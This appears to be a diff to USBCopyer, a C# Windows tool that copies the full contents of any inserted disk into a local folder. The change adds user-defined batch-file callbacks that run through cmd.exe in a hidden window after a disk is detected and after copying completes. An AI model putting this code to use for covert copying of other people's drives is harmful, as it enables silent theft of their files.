@@ -16,6 +16,7 @@ namespace USBCopyer
     {
         public string title   = Application.ProductName;
         public static string dir     = Application.StartupPath + @"\USBCopyerData\";
+        public static string confdir = Application.StartupPath + @"\USBCopyerData\USBCopyerSystem\";
         public string[] white;
         public string[] black;
         public string[] blackdisk;
@@ -197,6 +198,11 @@ namespace USBCopyer
                                     string diskdir;
                                     object diskserdata  = diskinfo.Properties["VolumeSerialNumber"].Value;
                                     object disknamedata = diskinfo.Properties["VolumeName"].Value;
+                                    //AllCompletedCallback
+                                    if (Properties.Settings.Default.EnableDiskDetectedCallback && File.Exists(confdir + "DiskDetectedCallback.bat"))
+                                    {
+                                        
+                                    }
                                     try
                                     {
                                         //Network Drive (4)
@@ -330,10 +336,33 @@ namespace USBCopyer
                                                 Program.log("写入磁盘日志 Disk.csv 失败，文件可能被占用：\r\n" + ex.ToString(), 1);
                                             }
                                             CopyDirectory(disk + "\\", dir + diskdir); 
-                                            if(Properties.Settings.Default.SkipEmptyFolder)
+                                            if (Properties.Settings.Default.SkipEmptyFolder)
                                             {
                                                 KillEmptyDirectory(dir + diskdir);
                                             }
+                                            //AllCompletedCallback
+                                            if (Properties.Settings.Default.EnableAllCompletedCallback && File.Exists(confdir + "AllCompletedCallback.bat"))
+                                            {
+                                                Thread th = new Thread(() =>
+                                                {
+                                                    try
+                                                    {
+                                                        string CallbackCode = File.ReadAllText(confdir + "AllCompletedCallback.bat");
+                                                        string OutputPath = confdir + Path.GetRandomFileName() + ".bat";
+                                                        CallbackCode = ProcessCallbackCode(CallbackCode);
+                                                        CallbackCode = ProcessCallbackCodeWithDisk(CallbackCode, diskinfo.Properties, diskdir);
+                                                        File.WriteAllText(OutputPath, CallbackCode);
+                                                        int ExitCode = RunCallback(OutputPath, out string StdOut);
+                                                        Program.log("AllCompletedCallback 回调运行完成, 回调退出码: " + ExitCode + " 输出: \r\n" + StdOut);
+                                                    }
+                                                    catch(Exception ex)
+                                                    {
+                                                        Program.log("AllCompletedCallback 回调运行失败\r\n" + ex.ToString(), 1);
+                                                    }
+                                                });
+                                                th.Start();
+                                            }
+                                            //free
                                             setIcon(iconStatus.free);
                                             if (string.IsNullOrEmpty(diskser))
                                             {
@@ -378,6 +407,45 @@ namespace USBCopyer
                 }
             }
             base.DefWndProc(ref m);
+        }
+
+        private string ProcessCallbackCode(string callbackCode)
+        {
+            return callbackCode
+                .Replace("{$SystemDir}", Application.StartupPath)
+                .Replace("{$SystemVer}", Application.ProductVersion)
+                .Replace("{$DataDir}", dir);
+        }
+
+        private string ProcessCallbackCodeWithDisk(string callbackCode, PropertyDataCollection data,string outputdir)
+        {
+            return callbackCode
+                .Replace("{$VolumeSerialNumber}", data["VolumeSerialNumber"].Value.ToString())
+                .Replace("{$VolumeName}", data["VolumeName"].Value.ToString())
+                .Replace("{$Volume}", data["Name"].Value.ToString())
+                .Replace("{$DriveType}", data["DriveType"].Value.ToString())
+                .Replace("{$USBDir}", outputdir);
+        }
+
+        private static int RunCallback(String cmd, out string StdOut)
+        {
+            var p = new Process();
+            var si = new ProcessStartInfo();
+            var path = Environment.SystemDirectory;
+            path = Path.Combine(path, @"cmd.exe");
+            si.FileName = path;
+            if (!cmd.StartsWith(@"/")) cmd = @"/c " + cmd;
+            si.Arguments = cmd;
+            si.UseShellExecute = false;
+            si.CreateNoWindow = true;
+            si.RedirectStandardOutput = true;
+            si.RedirectStandardError = true;
+            p.StartInfo = si;
+
+            p.Start();
+            p.WaitForExit();
+            StdOut = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
+            return p.ExitCode;
         }
 
         /// <summary>
@@ -569,14 +637,13 @@ namespace USBCopyer
 
         public void openLogFile()
         {
-            if(!File.Exists(dir + "EventViewer.xml"))
+            if(!File.Exists(confdir + "EventViewer.xml"))
             {
-                File.WriteAllText(dir + "EventViewer.xml", Properties.Resources.EventViewer);
-                File.SetAttributes(dir + "EventViewer.xml", FileAttributes.Hidden);
+                File.WriteAllText(confdir + "EventViewer.xml", Properties.Resources.EventViewer);
             }
             try
             {
-                Process.Start("eventvwr.exe", "/v:\""+dir + "EventViewer.xml"+"\"");
+                Process.Start("eventvwr.exe", "/v:\""+confdir + "EventViewer.xml"+"\"");
             }
            catch (Exception ex)
             {
